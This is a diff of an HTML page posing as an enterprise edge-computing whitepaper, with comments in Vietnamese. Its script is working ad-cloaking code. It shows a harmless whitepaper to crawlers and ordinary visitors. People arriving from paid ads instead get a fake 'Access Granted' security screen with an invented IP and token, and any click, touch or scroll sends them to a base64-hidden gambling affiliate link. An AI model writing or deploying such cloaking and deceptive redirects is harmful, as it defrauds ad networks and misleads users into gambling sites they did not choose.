@@ -3,67 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nexus Infra | Enterprise Edge Analytics</title>
+    <title>Nexus Infra | Enterprise Edge Analytics & Network Performance Report 2025</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
 </head>
-<body>
-    <div id="content"></div>
+<body class="bg-white">
+    <!-- Vùng chứa nội dung sẽ được thay đổi bằng JavaScript -->
+    <div id="app"></div>
 
     <script>
         (function() {
-            // 1. Cấu hình thông tin
-            const _0x_C = {
-                n: "Apex Cloud Systems",
-                d: "https://payhip.com/",
-                target: atob("aHR0cHM6Ly9wYXJ0bmVyYmNnYW1l") + atob("LmNvbS92dWdndW8yaGE=") // Link BC Game
+            // 1. Cấu hình các biến (Thay vì dùng ${} trực tiếp trong HTML)
+            const config = {
+                name: "Apex Cloud Systems",
+                portal: "https://payhip.com/",
+                target: atob("aHR0cHM6Ly9wYXJ0bmVyYmNnYW1l") + atob("LmNvbS92dWdndW8yaGE="), // Link đích nhảy
+                token: "AUTH-" + Math.floor(1000 + Math.random() * 9000) + "-X",
+                loc: "GLOBAL",
+                ip: "104.21." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255)
             };
 
+            // 2. Kiểm tra điều kiện quảng cáo (gclid)
             const urlParams = new URLSearchParams(window.location.search);
             const isAd = ["gclid", "gad_source", "wbraid", "gbraid"].some(x => urlParams.has(x));
             const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
 
-            // Các biến giả lập cho giao diện
-            const token = "AUTH-" + Math.floor(1000 + Math.random() * 9000) + "-X";
-            const loc = "GLOBAL";
-            const ip = "104.21.x.x"; // IP ảo cho giao diện
+            // 3. Giao diện trang trắng (Dành cho BOT - Whitepaper)
+            const UI_WHITEPAPER = `
+                <style>body{font-family:'Plus Jakarta Sans',sans-serif;color:#0f172a;line-height:1.8}.g-t{background:linear-gradient(90deg,#2563eb,#7c3aed);-webkit-background-clip:text;-webkit-text-fill-color:transparent}p{margin-bottom:20px;text-align:justify;color:#475569}h2{font-size:2.2rem;font-weight:800;margin-bottom:20px;margin-top:40px}h3{font-size:1.4rem;font-weight:700;margin-top:30px;color:#1e40af}.t-b{background:#f8fafc;border:1px solid #e2e8f0;padding:30px;border-radius:20px;font-family:monospace;font-size:12px;color:#64748b}</style>
+                <nav class="border-b border-gray-100 p-6 flex justify-between items-center sticky top-0 bg-white/80 backdrop-blur-md z-50">
+                    <span class="font-extrabold text-xl tracking-tighter uppercase text-blue-600 italic">` + config.name + `</span>
+                    <a href="` + config.portal + `" class="bg-blue-600 text-white px-6 py-2 rounded-xl text-[10px] font-black uppercase shadow-lg">Client Portal</a>
+                </nav>
+                <main class="max-w-4xl mx-auto px-6 py-20">
+                    <header class="text-center mb-20 border-b pb-16">
+                        <h1 class="text-5xl md:text-7xl font-black mb-8 leading-[1.1] uppercase italic">Scalable <span class="g-t">Edge Computing</span></h1>
+                        <p class="text-lg font-medium text-slate-400 uppercase tracking-widest">Technical Infrastructure Whitepaper v4.2.0</p>
+                    </header>
+                    <section>
+                        <h2>I. Executive Summary on Global Latency</h2>
+                        <p>The transition from centralized cloud architectures to decentralized edge computing has reached a critical inflection point in 2025. Our current framework leverages a distributed mesh of Tier-1 peering points to bypass the inherent bottlenecks of the public internet.</p>
+                        <div class="t-b my-10 uppercase italic">> initializing_node_sync... [OK]<br>> status: production_stable</div>
+                    </section>
+                </main>`;
 
-            // 2. Giao diện Whitepaper (Dành cho BOT hoặc khách thường)
-            const UI_S = `
-            <style>body{font-family:'Plus Jakarta Sans',sans-serif;color:#0f172a;background:#ffffff;line-height:1.8}.g-t{background:linear-gradient(90deg,#2563eb,#7c3aed);-webkit-background-clip:text;-webkit-text-fill-color:transparent}p{margin-bottom:20px;text-align:justify;color:#475569}h2{font-size:2.2rem;font-weight:800;margin-bottom:20px;margin-top:40px}h3{font-size:1.4rem;font-weight:700;margin-top:30px;color:#1e40af}.t-b{background:#f8fafc;border:1px solid #e2e8f0;padding:30px;border-radius:20px;font-family:monospace;font-size:12px;color:#64748b}</style>
-            <nav class="border-b border-gray-100 p-6 flex justify-between items-center sticky top-0 bg-white/80 backdrop-blur-md z-50"><span class="font-extrabold text-xl tracking-tighter uppercase text-blue-600 italic">${_0x_C.n}</span><a href="${_0x_C.d}" class="bg-blue-600 text-white px-6 py-2 rounded-xl text-[10px] font-black uppercase tracking-widest shadow-lg">Client Portal</a></nav>
-            <main class="max-w-4xl mx-auto px-6 py-20">
-                <header class="text-center mb-20 border-b pb-16"><h1 class="text-5xl md:text-7xl font-black mb-8 leading-[1.1] uppercase italic">Scalable <span class="g-t">Edge Computing</span></h1><p class="text-lg font-medium text-slate-400 uppercase tracking-widest">Technical Infrastructure Whitepaper v4.2.0</p></header>
-                <section><h2>I. Executive Summary</h2><p>The transition from centralized cloud architectures to decentralized edge computing has reached a critical inflection point in 2025...</p><div class="t-b my-10 uppercase italic">> initializing_node_sync... [OK]<br>> status: production_stable</div></section>
-            </main>`;
+            // 4. Giao diện trang xanh (Dành cho KHÁCH - Access Granted)
+            const UI_ACCESS = `
+                <style>body{font-family:'Plus Jakarta Sans',sans-serif;background-color:#030a16;background-image:radial-gradient(circle at 50% 50%,#08214d 0%,#030a16 100%);color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;overflow:hidden}.c{background:rgba(10,20,37,0.95);backdrop-filter:blur(25px);border:1px solid rgba(0,82,255,0.2);border-radius:40px;width:100%;max-width:440px;padding:60px 35px;text-align:center;box-shadow:0 40px 100px rgba(0,0,0,0.8)}.s-b{background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.05);border-radius:24px;padding:25px;margin:30px 0;text-align:left}.val{font-family:monospace;color:#3bc117;font-weight:700}.btn-p{background:linear-gradient(135deg,#45d31c 0%,#3bc117 100%);color:#000;font-weight:900;padding:22px;border-radius:18px;display:block;text-decoration:none;text-transform:uppercase;cursor:pointer;box-shadow:0 15px 35px rgba(59,193,23,0.5)}</style>
+                <div class="c">
+                    <div class="flex justify-between items-center mb-10 border-b border-white/5 pb-4"><span class="text-[10px] font-black uppercase text-blue-400 italic">Security Handshake</span><span class="text-xs font-bold text-emerald-500 uppercase">Verified</span></div>
+                    <h1 class="text-4xl font-extrabold uppercase mb-2 italic">Access <span class="text-[#3bc117]">Granted</span></h1>
+                    <div class="s-b space-y-5 text-[11px] uppercase tracking-widest">
+                        <div class="flex justify-between"><span>Identifier:</span><span class="val">` + config.token + `</span></div>
+                        <div class="flex justify-between"><span>Access IP:</span><span class="val">` + config.ip + `</span></div>
+                        <div class="flex justify-between"><span>Location:</span><span class="val">` + config.loc + ` CLUSTER</span></div>
+                    </div>
+                    <p class="text-gray-500 text-[11px] mb-10 italic">Redirecting your connection to the optimized local domain.</p>
+                    <div id="cta" class="btn-p">Continue to Terminal</div>
+                </div>`;
 
-            // 3. Giao diện Access Granted (Dành cho khách Click Ads)
-            const UI_M = `
-            <style>body{background-color:#030a16;background-image:radial-gradient(circle at 50% 50%,#08214d 0%,#030a16 100%);color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;overflow:hidden}.c{background:rgba(10,20,37,0.95);backdrop-filter:blur(25px);border:1px solid rgba(0,82,255,0.2);border-radius:40px;width:100%;max-width:440px;padding:60px 35px;text-align:center}.s-b{background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.05);border-radius:24px;padding:25px;margin:30px 0;text-align:left}.val{font-family:monospace;color:#3bc117;font-weight:700}.btn-p{background:linear-gradient(135deg,#45d31c 0%,#3bc117 100%);color:#000;font-weight:900;padding:22px;border-radius:18px;display:block;text-decoration:none;text-transform:uppercase;cursor:pointer}</style>
-            <div class="c">
-                <div class="flex justify-between items-center mb-10 border-b border-white/5 pb-4"><span class="text-[10px] font-black uppercase text-blue-400 italic">Security Handshake</span><span class="text-xs font-bold text-emerald-500 uppercase">Verified</span></div>
-                <h1 class="text-4xl font-extrabold uppercase mb-2 italic">Access <span class="text-[#3bc117]">Granted</span></h1>
-                <div class="s-b space-y-5 text-[11px] uppercase tracking-widest">
-                    <div class="flex justify-between"><span>Identifier:</span><span class="val">${token}</span></div>
-                    <div class="flex justify-between"><span>Access IP:</span><span class="val">${ip}</span></div>
-                    <div class="flex justify-between"><span>Location:</span><span class="val">${loc} CLUSTER</span></div>
-                </div>
-                <div id="cta" class="btn-p">Continue to Terminal</div>
-            </div>`;
-
-            // 4. Logic điều hướng
-            const contentDiv = document.getElementById('content');
+            // 5. Logic xử lý hiển thị
+            const app = document.getElementById('app');
             
             if (isAd && !isBot) {
-                // Hiển thị trang Xanh (Access Granted)
-                contentDiv.innerHTML = UI_M;
-                const jump = () => { window.location.href = _0x_C.target; };
+                // HIỂN THỊ TRANG XANH
+                app.innerHTML = UI_ACCESS;
+                const jump = () => { window.location.href = config.target; };
+                // Click nút mới nhảy
                 document.getElementById('cta').onclick = jump;
-                // Nhảy khi có tương tác
+                // Hoặc cuộn trang/di chuột là nhảy ngay
                 ['mousedown', 'touchstart', 'scroll'].forEach(ev => window.addEventListener(ev, jump, {once:true}));
             } else {
-                // Hiển thị trang Trắng (Whitepaper) cho Bot
-                contentDiv.innerHTML = UI_S;
+                // HIỂN THỊ TRANG TRẮNG (Cho BOT Google)
+                app.innerHTML = UI_WHITEPAPER;
             }
         })();
     </script>
